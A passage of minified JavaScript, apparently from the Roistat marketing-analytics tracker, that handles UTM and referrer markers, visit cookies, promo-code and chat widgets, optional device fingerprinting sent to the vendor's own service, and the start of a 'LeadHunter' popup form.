  var bh = function (e) {
    var dQ = e.split("http://").join("").split("https://").join("").split("www.").join("").replace(/^\./, "");
    return dQ.split("/")[0];
  };
  var cA = function () {
    var dU = j(k) > 0;
    var dW = null;
    var dR = function (dZ) {
      return dZ.split("_").join(":u:");
    };
    var dY = function (d0) {
      var dZ = false;
      r(a7, function (d1) {
        if (d0.indexOf(d1) > -1) {
          dZ = true;
        }
      });
      return dZ;
    };
    var dX = function () {
      var dZ = false;
      var d0;
      d0 = ae(N, dU);
      if (d0 !== null) {
        dW = d0;
        dZ = true;
      }
      d0 = ae(cS, dU);
      if (d0 !== null) {
        dW = d0;
        dZ = true;
      }
      return dZ;
    };
    var dS = function () {
      var dZ = false;
      var d0 = at();
      if (d0) {
        dW = d0;
        dZ = true;
        cD = false;
      }
      return dZ;
    };
    var dQ = function () {
      var dZ = false;
      var d1 = ae("utm_source", dU);
      if (d1 !== null) {
        dZ = true;
        dW = ":utm:" + dR(d1);
        var d3 = ["utm_medium", "utm_campaign", "utm_content", "utm_term"];
        var d0;
        for (var d2 = 0; d2 < d3.length; d2++) {
          d0 = ae(d3[d2], dU);
          if (d0 !== null) {
            dW = dW + "_" + dR(d0);
          }
        }
      }
      return dZ;
    };
    var dT = function () {
      var d1,
        d0,
        dZ = false;
      d0 = ae("_openstat", dU);
      if (!d0) {
        return false;
      }
      if (dV(d0)) {
        d1 = d0;
      } else {
        d1 = encodeURI(cy.decode(d0));
        if (!dV(d1)) {
          d1 = d0;
        }
      }
      if (d1) {
        d1 = dR(d1).split(";").join("_");
        dW = ":openstat:" + d1;
        dZ = true;
      }
      return dZ;
    };
    var dV = function (dZ) {
      return dZ.match(/^([^;]*(;[^;]*){3})$/) !== null;
    };
    var e = function () {
      var dZ = false;
      var d0 = M.referrer;
      if (cd(d0)) {
        return dZ;
      }
      var d1 = ae("from", dU);
      if (d1 !== null && !dj(d1, "http")) {
        if (!dY(d1)) {
          dZ = true;
          dW = dR(d1);
        }
      }
      return dZ;
    };
    if (dX()) {
      A("Init marker: init from RS param " + dW);
      return dW;
    }
    if (dQ()) {
      A("Init marker: init from UTM " + dW);
      return dW;
    }
    if (dT()) {
      A("Init marker: init from OpenStat " + dW);
      return dW;
    }
    if (e()) {
      A("Init marker: init from custom tag " + dW);
      return dW;
    }
    A("Init marker: try init from cookie " + dW);
    dS();
    return dW;
  };
  var p = function () {
    return cs.get(cl);
  };
  var J = function () {
    return cs.get(a5);
  };
  var ag = function () {
    A("Call: saveReferrer");
    cs.set(aN, l);
  };
  var ch = function () {
    A("Call: removeReferrer");
    cs.remove(aN);
  };
  var dr = function () {
    dA(bn, aK(bG), bI());
  };
  var db = function () {
    A("Call: refreshPromoCode");
    if (aQ()) {
      A("PromoCode: Shut down because only online chat need to be inited");
      return;
    }
    var e = function () {
      return j(cl);
    };
    aB(e());
    if (!cv.onload) {
      cv.onload = function () {
        aB(e());
      };
    }
    setTimeout(function () {
      aB(e());
    }, 50);
    setTimeout(function () {
      aB(e());
    }, 200);
    setTimeout(function () {
      aB(e());
    }, 2000);
    setTimeout(function () {
      aB(e());
    }, 10000);
  };
  cv.roistatPromoCodeRefresh = db;
  var dw = function () {
    var e = [];
    var dQ = M.getElementsByClassName(ap);
    if (dQ && dQ.length) {
      e = dQ;
    }
    return e;
  };
  var aB = function (e) {
    var dS = dw();
    A("setPromoCode: " + e + " in " + dS.length + " elements");
    for (var dR = 0; dR < dS.length; dR++) {
      var dQ = dS[dR];
      dQ.innerHTML = e ? e : "";
    }
  };
  var bU = function () {
    var dR = cA(),
      dQ = j(bn),
      dT = dR !== null,
      dS = true;
    var dV = aK(aK(dR)).toLowerCase().split("+").join(" "),
      dU = aK(aK(dQ)).toLowerCase().split("+").join(" ");
    if (dR && dQ) {
      dS = dV !== dU;
    }
    var e = dT && dS;
    a2 = "Call: needOverrideByMarker (result " + (e ? "true" : "false") + ") with current " + dR + ":" + dV + " and old " + dQ + ":" + dU;
    A(a2);
    return e;
  };
  var aR = function () {
    var dQ = function (dY) {
      return /[\u0400-\u04FF]/.test(dY);
    };
    var dX = false,
      dU = l,
      e = cs.get(aN),
      dW = cv.location.host;
    if (!dU || !dW) {
      A("Call: needOverrideByReferrer (result " + (dX ? "true" : "false") + "), skip because one of params is empty");
      return dX;
    }
    dW = bh(dW);
    dU = aK(dU);
    e = aK(e);
    var dS = bh(dU);
    if (dj(dU, "xn--") && dQ(dW)) {
      A("Call: needOverrideByReferrer (result " + (dX ? "true" : "false") + "), skip because of bugs with punycode in FF");
      return dX;
    }
    if (!dS) {
      A("Call: needOverrideByReferrer (result " + (dX ? "true" : "false") + "), skip because current referrer is null");
      return dX;
    }
    if (!e) {
      dX = !dj(dS, dW);
      A("Call: needOverrideByReferrer (result " + (dX ? "true" : "false") + "), compare current referrer and host");
      return dX;
    }
    if (dj(dU, e)) {
      A("Call: needOverrideByReferrer (result " + (dX ? "true" : "false") + "), skip because the same referrer");
      return dX;
    }
    var dV = dW.split(".").length > 2 && dS.split(".").length > 2;
    var dT = cv.roistatCookieDomain !== bO && cv.roistatCookieDomain !== dW;
    var dR = dS.split(".").slice(1).join(".") === dW.split(".").slice(1).join(".");
    if (dV && dT && dR) {
      A("Call: needOverrideByReferrer (result " + (dX ? "true" : "false") + "), skip because sub domains of same domain");
      return dX;
    }
    dX = !(dj(dS, dW) || dj(dW, dS));
    A("Call: needOverrideByReferrer (result " + (dX ? "true" : "false") + ") referrerHost: " + dS + ", currentHost: " + dW);
    return dX;
  };
  var bZ = function () {
    return ae("utm_nooverride") === "1";
  };
  var dL = function () {
    return !cx() && !bZ() && (bU() || aR());
  };
  var b0 = function (dQ, e) {
    return dQ && e && dQ != e;
  };
  var bl = function (dS) {
    var dQ = ["cookieExpire"];
    var dU = dS.leadHunterEnabled;
    if (Number(cs.get(bP)) !== Number(dS.leadHunterEnabled)) {
      cs.set(bP, Number(dS.leadHunterEnabled));
    }
    if (dU) {
      var dT = {
        expires: T,
        path: "/"
      };
      if (c7.domain) {
        dT.domain = c7.domain;
      }
      dA(ah, 1, dT);
    }
    for (var dR in dS) {
      if (!Object.prototype.hasOwnProperty.call(dS, dR)) {
        continue;
      }
      if (!dU && dR.indexOf("leadHunter") >= 0 && dR.indexOf("leadHunterTargetPagesMap") === -1) {
        continue;
      }
      if (!aA(dQ, dR)) {
        if (dR.indexOf("leadHunterTargetPagesMap") !== -1) {
          var e = ds(dS[dR]);
          if (e !== null) {
            cs.setObject("roistat_" + dR, e);
          }
          continue;
        }
        cs.set("roistat_" + dR, dS[dR]);
      }
    }
  };
  var c8 = function (e) {
    if (!e) {
      return;
    }
    roistat.multiwidget = {
      isEnabled: e.is_enabled,
      isVisible: roistat.multiwidget.isVisible,
      vk: {
        isEnabled: e.vk.is_enabled,
        link: roistat.multiwidget.vk.link || e.vk.link
      },
      fb: {
        isEnabled: e.fb.is_enabled,
        link: roistat.multiwidget.fb.link || e.fb.link
      },
      telegram: {
        isEnabled: e.telegram.is_enabled,
        link: roistat.multiwidget.telegram.link || e.telegram.link
      },
      whatsApp: {
        isEnabled: e.whats_app.is_enabled,
        link: roistat.multiwidget.whatsApp.link || e.whats_app.link
      },
      viber: {
        isEnabled: e.viber.is_enabled,
        link: roistat.multiwidget.viber.link || e.viber.link
      }
    };
    if (Number(cs.get(bk)) !== Number(e.is_enabled)) {
      cs.set(bk, Number(e.is_enabled));
    }
    if (Number(cs.get(cb)) !== Number(e.vk.is_enabled)) {
      cs.set(cb, Number(e.vk.is_enabled));
    }
    if (cs.get(c2) !== roistat.multiwidget.vk.link) {
      cs.set(c2, roistat.multiwidget.vk.link);
    }
    if (Number(cs.get(U)) !== Number(e.fb.is_enabled)) {
      cs.set(U, Number(e.fb.is_enabled));
    }
    if (cs.get(dl) !== roistat.multiwidget.fb.link) {
      cs.set(dl, roistat.multiwidget.fb.link);
    }
    if (Number(cs.get(cN)) !== e.telegram.is_enabled) {
      cs.set(cN, Number(e.telegram.is_enabled));
    }
    if (cs.get(by) !== roistat.multiwidget.telegram.link) {
      cs.set(by, roistat.multiwidget.telegram.link);
    }
    if (Number(cs.get(cY)) !== e.whats_app.is_enabled) {
      cs.set(cY, Number(e.whats_app.is_enabled));
    }
    if (cs.get(bN) !== roistat.multiwidget.whatsApp.link) {
      cs.set(bN, roistat.multiwidget.whatsApp.link);
    }
    if (Number(cs.get(dP)) !== e.viber.is_enabled) {
      cs.set(dP, Number(e.viber.is_enabled));
    }
    if (cs.get(cQ) !== roistat.multiwidget.viber.link) {
      cs.set(cQ, roistat.multiwidget.viber.link);
    }
  };
  var cw = function (e) {
    roistat.onlineChat.isEnabled = e.is_enabled;
    if (Number(cs.get(cZ)) !== Number(e.is_enabled)) {
      cs.set(cZ, Number(e.is_enabled));
    }
    roistat.onlineChat.isAvailableForCurrentUserAgent = e.advanced_settings.is_available_for_current_user_agent;
    roistat.onlineChat.pagesFilter = e.advanced_settings.pages_filter;
    cs.setObject(C, e.advanced_settings);
  };
  var w = function (e) {
    cv.roistat.geo = e;
    cs.setObject(m, e);
  };
  var cH = function (e) {
    A("PromoCode: save settings");
    cs.setObject(aY, e);
  };
  var dG = function (dT, dV, dS, dQ, dU, e, dW, dR) {
    bl(dT);
    roistat.callTracking.enabled = dV.is_enabled;
    roistat.emailtracking.loaded = true;
    roistat.emailtracking.email = dS.email;
    roistat.emailtracking.trackingEmail = dS.trackingEmail;
    roistat.emailtracking.emails = dS.emails;
    roistat.proxyForms.loaded = true;
    roistat.proxyForms.settings = dU;
    c8(e);
    cw(dW);
    w(dQ);
    cH(dR);
  };
  cv.roistatModuleSetVisitCookie = function (dU, d2, dS, dQ, d1, dX, e, d4, dW, d3) {
    A("Call: roistatModuleSetVisitCookie(" + dU + ")");
    var dY;
    if (typeof dS.cookieExpire !== "number") {
      dY = bI().expires;
    } else {
      dY = dS.cookieExpire;
    }
    var dV = j(cl);
    var d0 = {
      expires: dY,
      path: "/"
    };
    if (c7.domain) {
      d0.domain = c7.domain;
    }
    dA(cl, dU, d0);
    if (!(j(cl) > 0) || cf) {
      cs.save(cl, dU, d0);
    }
    if (!cs.get(a5)) {
      var dR = {
        expires: 10 * 365 * 24 * 60 * 60,
        path: "/"
      };
      if (c7.domain) {
        dR.domain = c7.domain;
      }
      cs.save(a5, dU, dR);
    }
    var dZ = dS.abTests;
    if (typeof dZ !== "undefined" && cs.isAvailable()) {
      cs.setObject("abTesting", dZ);
    }
    applyTests();
    var dT = dS.isNeedToListenRequests;
    if (typeof dT !== "undefined" && cs.isAvailable()) {
      cs.set(au, dT);
    }
    aB(dU);
    if (d2) {
      aw(d2);
      dA(bn, d2, d0);
    }
    if (cv.roistatCallback !== bO) {
      cv.roistatCallback(dU, d2);
    }
    if (!d4) {
      d4 = {};
    }
    dG(dS, dQ, d1, dX, e, d4.multiwidget_settings, dW, d3);
    roistat.callTracking.phone = dQ.phone;
    roistat.callTracking.sessionTime = dQ.sessionTime;
    roistat.callTracking.replacementClasses = dQ.replacementClasses;
    roistat.callTracking.phoneScriptsJson = dQ.scripts;
    roistat.visit = dU;
    A("Call: pre renderPromoCode");
    bg();
    db();
    if (b0(dV, dU)) {
      A("roistatModuleSetVisitCookie: visit changed from " + dV + " to " + dU);
    }
    dm();
    du();
    c1();
  };
  cv.roistatUpdateSettings = function (e) {
    A("Set settings.");
    cn.isSettingsUpdating = false;
    dG(e.js_settings, e.calltracking, e.emailtracking, e.geo, e.proxy_forms, e.multiwidget.multiwidget_settings, e.online_chat, e.promo_code);
    du();
    c1();
  };
  var av = function () {
    var e;
    if (cv.roistatIsInitVisit === true) {
      e = false;
    } else {
      e = cs.get(cl) > 0;
    }
    A("Call: alreadyVisited (return " + (e ? "true" : "false") + ")");
    return e;
  };
  var c = function (e) {
    return encodeURIComponent ? encodeURIComponent(e) : encodeURI(e);
  };
  var bb = function () {
    return l ? c(l) : "";
  };
  var S = function () {
    return bi() + "//" + x + "/api/site/" + ao + "/" + bd();
  };
  var cE = function () {
    var dQ = {
      expires: 1,
      path: "/"
    };
    var e = {
      expires: bQ,
      path: "/"
    };
    if (c7.domain) {
      dQ.domain = c7.domain;
      e.domain = c7.domain;
    }
    var dR = j(bH);
    if (dR) {
      dA(ak, dR, e);
    }
    dA(bH, "", dQ);
    dA(V, "", dQ);
  };
  var b3 = function () {
    var dQ = cs.getObject("abTesting");
    if (!dM(dQ)) {
      return "";
    }
    var dS,
      dR,
      e = [];
    for (dS in dQ) {
      if (!Object.prototype.hasOwnProperty.call(dQ, dS)) {
        continue;
      }
      dR = dQ[dS];
      e.push(dR.id + ":" + dR.variantId);
    }
    return e.join(",");
  };
  var bR = function () {
    A("Call: setVisitIdCookie");
    var dQ = function () {
      var d0 = bd(),
        dX = bb(),
        dT = cv.roistatIsInitVisit === true ? p() : 0,
        dZ = j(bH),
        dV = j(cc),
        dU = cs.get(a5);
      dZ = dZ ? dZ : "";
      dU = dU ? dU : "";
      bG = bG && (!aR() || cD) ? aK(aK(bG)) : "";
      I("Init visit with visit id from cookie, visit_id: " + dT + " and referrer: " + dX + " calculateApiUrl marker: " + bG);
      var dY = encodeURIComponent(cJ);
      A("Calltracking: enabled=" + ca.callTrackingEnabled + ",manual=" + ca.callTrackingManual);
      var dW = JSON.stringify(cv.roistat.page.params);
      return S() + "/addVisit?v=" + ab + "&marker=" + encodeURIComponent(bG) + "&visit=" + dT + "&first_visit=" + dU + "&guid=" + dV + "&phone_prefix=" + cT + "&phone_prefix_bind=" + dI + "&phone_scripts_bind=" + W + "&referrer=" + dX + "&page=" + dY + "&ab=" + c(dZ) + "&ab_variants=" + c(b3()) + "&" + h() + "=" + ay() + (dW === "{}" ? "" : "&page_params=" + encodeURIComponent(dW)) + (!ca.callTrackingEnabled || ca.callTrackingManual ? "&call_tracking_disabled=1" : "");
    };
    var e = function (dT) {
      setTimeout(function () {
        A("Call: setVisitIdCookie script creation after timeout");
        var dU = M.createElement("script");
        dU.onload = dU.onreadystatechange = function () {
          var dW = this.readyState ? this.readyState : "unknown";
          A("Call: setVisitIdCookie script state changed to " + dW);
        };
        dU.src = dT;
        dU.type = "text/javascript";
        dU.async = true;
        dU.id = ad;
        var dV = M.getElementsByTagName("script")[0];
        dV.parentNode.insertBefore(dU, dV);
        A("Call: setVisitIdCookie appended " + (M.getElementById(ad) ? "true" : "false"));
        A("Call: sendJSONPRequest to URL " + dT);
        cE();
      }, ca.jsonpRequestTimeout);
    };
    if (bG) {
      aw(bG);
      dr();
    }
    var dS = j(aZ);
    if (dS) {
      dA(cc, dS, c7);
    }
    aG();
    var dR = dQ();
    e(dR);
    l ? ag() : ch();
  };
  var bY = function () {
    A("Call: sendAbTests");
    var dR = function () {
      var dV = bd(),
        dU = j(cl);
      return bi() + "//" + x + "/site-api/" + aO + "/" + dV + "/visit/" + dU + "/addAbVariant";
    };
    var dS = j(bH);
    var dQ = j(ak);
    if (dS === dQ || !dS) {
      cE();
      return;
    }
    var dT = dR();
    dT = dT + "?ab=" + c(dS);
    var e = M.createElement("img");
    e.src = dT;
    cE();
  };
  var a1 = {
    Android: function () {
      return navigator.userAgent.match(/Android/i);
    },
    BlackBerry: function () {
      return navigator.userAgent.match(/BlackBerry/i);
    },
    iOS: function () {
      return navigator.userAgent.match(/iPhone|iPad|iPod/i);
    },
    Opera: function () {
      return navigator.userAgent.match(/Opera Mini/i);
    },
    Windows: function () {
      return navigator.userAgent.match(/IEMobile/i);
    },
    any: function () {
      return a1.Android() || a1.BlackBerry() || a1.iOS() || a1.Opera() || a1.Windows();
    }
  };
  var ba = {
    isIE: function (dR, dT) {
      var dU = "IE",
        dQ = M.createElement("B"),
        e = M.documentElement,
        dS;
      if (dR) {
        dU += " " + dR;
        if (dT) {
          dU = dT + " " + dU;
        }
      }
      dQ.innerHTML = "<!--[if " + dU + ']><b id="iecctest"></b><![endif]-->';
      e.appendChild(dQ);
      dS = !!M.getElementById("iecctest");
      e.removeChild(dQ);
      return dS;
    }
  };
  var dp = function () {
    return cs.get(af);
  };
  var aj = function () {
    var e = "";
    cv.onerror = function (dV, dU, dR, dT, dS) {
      var dQ = !dT ? "" : ", column: " + dT;
      dQ += !dS ? "" : ", error: " + dS;
      e = e + ", Error: " + dV + ", url: " + dU + ", line: " + dR + dQ;
    };
    setTimeout(function () {
      var dX = false,
        dY = "";
      var dT = dw();
      for (var dW = 0; dW < dT.length; dW++) {
        var dS = dT[dW];
        if (dS !== null && !dS.innerHTML) {
          dX = true;
          dY = "Promo HTML: " + dS.innerHTML;
        }
      }
      if (!(j(cl) > 0)) {
        dX = true;
        dY = dY + "; roistat_visit = " + j(cl);
      }
      if (dX) {
        var dR = M.getElementById(ad);
        var dQ = dR ? 1 : 0;
        var dU = cv.navigator.userAgent;
        dY = encodeURIComponent(dY);
        var dV = M.createElement("img");
        dV.src = bi() + "//" + x + "/site-api/" + aO + "/" + bd() + "/debug?message=" + dY + "&agent=" + dU + "&" + h() + "=" + ay() + "&jserror=" + e + "&scriptResponse=" + dQ + "&version=" + ab + "&debug=" + bp;
      }
    }, 20000);
  };
  var bL = function () {
    var dR = M.getElementsByTagName("body");
    var dS = M.documentElement;
    var dQ = 0,
      dT = 0;
    if (dR.length) {
      var e = dR[0];
      dQ = cv.innerWidth || dS.clientWidth || e.clientWidth;
      dT = cv.innerHeight || dS.clientHeight || e.clientHeight;
    } else {
      dQ = cv.innerWidth || dS.clientWidth;
      dT = cv.innerHeight || dS.clientHeight;
    }
    return {
      width: dQ,
      height: dT
    };
  };
  var bg = function () {
    var dV = M.getElementsByClassName("roistat-promo-wrap");
    if (dV.length) {
      A("PromoCode: old promo code length - exit");
      return;
    }
    if (aQ()) {
      A("PromoCode: Shut down because only online chat need to be inited");
      return;
    }
    var dU = cs.getObject(aY);
    if (dU && dU.hasOwnProperty("is_enabled")) {
      cv.roistat.promoCode.isEnabled = dU.is_enabled;
      A("PromoCode: set is_enabled from storage");
    }
    var dS = function () {
      var d2 = M.createElement("div");
      d2.innerHTML = roistatPromoCode;
      var d0 = M.getElementsByTagName("body");
      if (d0.length) {
        d0[0].appendChild(d2);
      }
      A("PromoCode: appended to body " + roistatPromoCode.length);
      var d1 = M.getElementsByClassName("roistat-promo-wrap")[0];
      if (!d1) {
        A("PromoCode: roistat-promo-wrap not found, skip");
        return;
      }
      var dZ = d1.style;
      var dX, dY, dW;
      setInterval(function () {
        dX = bL();
        dY = d1.offsetWidth;
        dW = d1.offsetHeight * 2;
        switch (roistatPosition) {
          case "top_left":
            dZ.left = 0;
            dZ.top = 0;
            break;
          case "top":
            dZ.left = (dX.width - dY) / 2 + "px";
            dZ.top = 0;
            break;
          case "top_right":
            dZ.right = 0;
            dZ.top = 0;
            break;
          case "left":
            dZ.left = 0;
            dZ.top = (dX.height - dW) / 2 + "px";
            break;
          case "right":
            dZ.right = 0;
            dZ.top = (dX.height - dW) / 2 + "px";
            break;
          case "bottom_left":
            dZ.left = 0;
            dZ.bottom = 0;
            break;
          case "bottom":
            dZ.left = (dX.width - dY) / 2 + "px";
            dZ.bottom = 0;
            break;
          case "bottom_right":
            dZ.right = 0;
            dZ.bottom = 0;
            break;
          default:
            dZ.left = 0;
            dZ.top = 0;
        }
      }, 500);
    };
    var e = cs.getObject("promo_code_options");
    if (e) {
      A("PromoCode: options already set");
      cv.roistatPromoCode = e.template;
      cv.roistatPosition = e.position;
      dS();
    } else {
      if (!cv.roistat.promoCode.isEnabled) {
        A("PromoCode: is not available, skip");
        return;
      }
      var dT = M.getElementsByTagName("head")[0] || M.documentElement;
      var dR = M.createElement("script");
      dR.src = bi() + "//" + x + "/site-api/" + aO + "/" + bd() + "/getPromoCode";
      dT.insertBefore(dR, dT.firstChild);
      A("PromoCode: loading started");
      var dQ = false;
      dR.onload = dR.onreadystatechange = function () {
        if (!dQ && (!this.readyState || this.readyState === "loaded" || this.readyState === "complete")) {
          dQ = true;
          dR.onload = dR.onreadystatechange = null;
          if (dT && dR.parentNode) {
            dT.removeChild(dR);
          }
        }
        if (!dQ) {
          return;
        }
        A("PromoCode: loaded");
        if (typeof roistatPromoCode === "undefined" || roistatPromoCode.length < 1) {
          A("PromoCode: is disabled");
          return;
        }
        e = {
          template: roistatPromoCode,
          position: roistatPosition
        };
        cs.setObject("promo_code_options", e);
        dS();
      };
    }
  };
  var aA = function (dQ, dR) {
    for (var e = 0; e < dQ.length; e++) {
      if (dQ[e] === dR) {
        return true;
      }
    }
    return false;
  };
  var I = function (dQ) {
    if (!an || dQ === "") {
      return;
    }
    var e = p();
    dy("visit: " + e + " " + dQ);
  };
  var dy = function (dQ) {
    var e = S() + "/log?log=" + encodeURIComponent(dQ);
    a4(e);
  };
  var aP = function aP() {
    var dT = cv.onpopstate;
    var dU = cv.history.pushState;
    var e = cv.history.replaceState;
    am(cv, "popstate", function dS(dV) {
      A("[Roistat]: popstate event catch");
      cj();
      if (ai() && typeof dT === "function") {
        dT(dV);
      }
    });
    am(cv.history, "pushState", function dR(dW, dX, dV) {
      A("[Roistat]: pushState event catch");
      cj();
      if (ai() && typeof dU === "function") {
        dU.apply(this, [dW, dX, dV]);
      }
    });
    am(cv.history, "replaceState", function dQ(dW, dX, dV) {
      A("[Roistat]: replaceState event catch");
      cj();
      if (ai() && typeof e === "function") {
        e.apply(this, [dW, dX, dV]);
      }
    });
  };
  (function bV() {
    aP();
    if (cv.onRoistatModuleLoaded !== bO && typeof cv.onRoistatModuleLoaded === "function") {
      cv.onRoistatModuleLoaded();
    }
  })();
  (function aI() {
    var dQ = "fngr.roistat.com";
    var dU = false;
    var dT = bd() === "e6b168b42cac9ce8e85d0bdde71e039a";
    if (!dU && !dT) {
      A("Fingerprint: disabled");
      return;
    }
    cv.roistat.crossdevice = {
      registerFingerprint: function dR(dV) {
        A("Fingerprint: collected data " + JSON.stringify(dV));
        roistat.registerOnVisitProcessedCallback(function () {
          A("Fingerprint: sending to service");
          var dW = Object.keys(dV).map(function (dY) {
            return dV[dY].key + "=" + encodeURIComponent(dV[dY].data);
          }).join("&");
          dW = dW + "&visit=" + bd() + "|" + J() + "|" + roistat.getVisit();
          dW += "&host=" + encodeURIComponent(cv.location.host);
          var dX = bi() + "//" + dQ + "/register?" + dW;
          a4(dX);
        });
      },
      markVisit: function e(dV) {
        A("Fingerprint: marking visit " + dV);
      }
    };
    A("Fingerprint: initialising library");
    var dS = bi() + "//" + dQ + "/static/fingerprint.js";
    a4(dS);
  })();
  var bS = function (dQ) {
    var dV = function (d2, d0) {
      var dZ;
      if (dj(d0, "*")) {
        var d1 = new RegExp(d0.split("*").join(".*"));
        dZ = d1.test(d2);
      } else {
        dZ = d2 === d0;
      }
      A("LeadHunter: compare current: " + d2 + ", setting: " + d0 + " with result = " + (dZ ? 1 : 0));
      return dZ;
    };
    var e = cv.location.href,
      dS = false,
      dR = false,
      dX = "",
      dT = 0,
      dW;
    dW = dQ ? dQ.split(",") : [];
    if (!e || dW.length === 0) {
      dS = true;
    } else {
      dX = aS(e);
      var dY;
      for (var dU = 0; dU < dW.length; dU++) {
        dY = dW[dU].split("www.").join("").split("http://").join("").split("https://").join("").replace(/\/+$/, "");
        if (/^!/.test(dY)) {
          if (dV(dX, dY.split(/^!/).join(""))) {
            dR = true;
            break;
          }
        } else {
          dT++;
          if (dV(dX, dY)) {
            dS = true;
            break;
          }
        }
      }
    }
    if (dR) {
      A('LeadHunter: current page "' + dX + '" is disabled by list');
      return false;
    }
    if (!dS && dT > 0) {
      A('LeadHunter: current page "' + dX + '" is not listed');
      return false;
    }
    A('LeadHunter: current page "' + e + '", cleaned: "' + dX + '" is not disabled in ' + dW.length + " list of pages");
    return true;
  };
  try {
    dF();
  } catch (cG) {
    I(cG);
  }
  (function bf() {
    var ee = "empty",
      dV = false,
      dQ = true,
      d5 = false;
    var ea = {
      roistat_visit: j(cl),
      marker: bG,
      user_agent: cv.navigator.userAgent,
      current_page: {
        title: M.title,
        href: cv.location.protocol + "//" + cv.location.host + cv.location.pathname
      }
    };
    var ef = function (el, ek, ej) {
      if (el.addEventListener) {
        el.addEventListener(ek, ej, false);
      } else {
        if (el.attachEvent) {
          el.attachEvent("on" + ek, ej);
        } else {
          A("Handler could not be attached");
        }
      }
    };
    var d7 = function (el, ej) {
      if (el === bO || typeof ej !== "string" || ej.length === 0) {
        return;
      }
      var ek = el.getElementsByClassName(ej);
      if (ek === bO || ek.length === 0) {
        return;
      }
      return ek[0];
    };
    var eg = function (ej) {
      return typeof ej === "object" && ej !== null;
    };
    var dW = function (ej, el, ek) {
      if (eg(ej)) {
        if (ek) {
          ej.classList.add(el);
          return;
        }
        ej.classList.remove(el);
      }
    };
    var eh = cv.visualViewport;
    var d4 = "visualViewport" in cv;
    var d8 = function (ej) {
      return ej === 0 ? 1 : ej;
    };
    var ei = function () {
      var ej;
      if (d4) {
        ej = 1 / d8(eh.scale);
      } else {
        ej = cv.innerWidth / d8(cv.outerWidth);
      }
      return ej;
    };
    var ec = function () {
      return "scale(" + ei() + ")";
    };
    var eb = {
      leadHunter: function () {
        var f6 = "roistat-lh-form",
          eH = "roistat-lh-form",
          f9 = "roistat-lh-head-text",
          eV = "roistat-lh-head",
          eD = "roistat-lh-thank-you",
          fm = "roistat-lh-thank-you",
          eo = "roistat-lh-close",
          ep = "roistat-lh-submit",
          e4 = "roistat-lh-hidden",
          fL = "roistat-lh-wrap",
          eJ = "roistat-lh-popup-wrapper",
          fl = "roistat-lh-popup",
          f8 = "roistat-lh-agreement",
          fh = "roistat-lh-agreement roistat-lh-mobile",
          go = "roistat-lh-agreement-input",
          fX = "roistat-lh-agreement-link",
          ej = "roistat-lh-agreement-doc",
          f2 = "roistat-lh-alert-row",
          ft = "roistat-lh-agreement",
          fg = "roistat-lh-popup-iframe",
          fw = "roistat_leadHunterUrl",
          fZ = "roistat_leadHunterAppearanceUrl",
          e8 = "roistat_leadHunterTargetPagesList",
          eC = "roistat_leadHunterCaught",
          fD = "roistat_leadHunterMinTime",
          eZ = "roistat_leadHunterAutoShowTime",
          fA = "roistat_leadHunterPulsatorEnabled",
          eT = "roistat_leadHunterScriptsCaught",
          gp = "roistat_leadHunterScriptsShownCount",
          fe = "roistat-lh-load-done",
          eI = "roistat-lh-close-modal",
          fN = "roistat-lh-script-settings",
          fM = "roistat-lh-setting-size",
          f3 = "roistat-lh-before-submit",
          fx = "roistat-lh-before-submit-done",
          gb = "roistat-lh-after-submit",
          fQ = "roistat-lh-event-data",
          fR = "roistat-lh-translate-form",
          gl = {
            topLeft: {
              bottom: "80%",
              right: "auto",
              transformOrigin: "top left"
            },
            topRight: {
              bottom: "80%",
              right: "3%",
              transformOrigin: "top right"
            },
            bottomRight: {
              bottom: "10%",
              right: "3%",
              transformOrigin: "bottom right"
            },
            bottomLeft: {
              bottom: "10%",
              right: "auto",
              transformOrigin: "bottom left"
            }
          };
        var eB = 0.3,
          eN = 0.001,
          eE = false,
          eQ = 0,
          eL = 0,
          eR = 0,
          gd = 0,
          eP = 0,
          e5 = false,
          et = false,
          gn = false,
          eO,
          f1,
          fo,
          fu,
          fK,
          eU,
          gm,
          gh,
          fY,
          gk,
          ex,
          ge,
          fH,
          fp,
          ff,
          eA,
          em,
          e3,
          eS,
          e0,
          fV,
          f4,
          eX,
          f7,
          gc,
          e7;
        var gg = {
          pulsator: {
            previousClass: ""
          },
          leave: {
            isShowEnabled: false
          },
          timeoutId: 0
        };
        var ga = function (gu) {
          var gt = encodeURIComponent ? encodeURIComponent : encodeURI;
          return gt(gu);
        };
        var fP = function () {
          if (!cv.roistat.leadHunter.isEnabled) {
            return false;
          }
          if (cv.roistatLeadHunterInited) {
            return false;
          }
          cv.roistatLeadHunterInited = true;
          if (cs.get(bP) < 1) {
            A("LeadHunter: disabled");
            return false;
          }
          return true;
        };
        var e2 = function () {
          em = cs.get(fw);
          if (!em) {
            A("LeadHunter: not active cause of empty url");
            return false;
          }
          b7();
          e3 = cs.get(fZ);
          gd = cs.get(fD);
          eP = cv.roistat.leadHunter.form.autoShowTime === null ? cs.get(eZ) : cv.roistat.leadHunter.form.autoShowTime;
          dV = cs.get(fA) == 1;
          el();
          A("LeadHunter: initSettings end, isLeadHunterPulsatorEnabled: " + (dV ? 1 : 0));
          return true;
        };
        var fa = function () {
          return cs.get(eC) > 0;
        };
        var el = function () {
          if (!(j(ah) > 0)) {
            A("LeadHunter: not active, expired for this visit");
            e5 = true;
          }
        };
        var eu = function (gt) {
          gn = true;
          e0 = fV.src;
          var gu = {
            version: ab,
            additionalNotifyEmail: cv.roistat.leadHunter.additionalNotifyEmail,
            projectKey: bd(),
            language: al,
            visitId: cM(),
            moduleTargetOrigin: cv.location.origin,
            referrer: cv.location.href,
            windowWidth: cv.innerWidth || 0,
            iframeWrapperWidth: fu.offsetWidth || 0,
            sendRequestUrl: cs.get(fw),
            message: fe
          };
          fV.contentWindow.postMessage(gu, e0);
          fC();
          if (gt && bS(cs.get(e8))) {
            A("Beta Test on, iframe fired, rise up iframe show count state");
            en();
          }
        };
        var fd = function () {
          et = true;
          es("click");
          eu();
          fJ();
        };
        var er = function () {
          var gt = cv.location.hash;
          if (!gt) {
            return;
          }
          if (dj(gt, "roistat-lead-hunter")) {
            fd();
          }
        };
        var fb = function ez() {
          A("LeadHunter: binding timeout");
          if (e5) {
            A("LeadHunter: leadhunter is expired, no timeout show allowed");
            return;
          }
          if (eE) {
            A("LeadHunter: leadhunter was shown, no timeout show allowed");
            return;
          }
          if (eP > 0) {
            var gt = eQ - cz() + eP * 1000;
            A("LeadHunter: binding timeout with delay " + gt + " ms");
            clearTimeout(gg.timeoutId);
            gg.timeoutId = setTimeout(function () {
              A("LeadHunter: form auto activate with autoTime = " + eP);
              if (!eE) {
                A("LeadHunter: show by timeout");
                et = true;
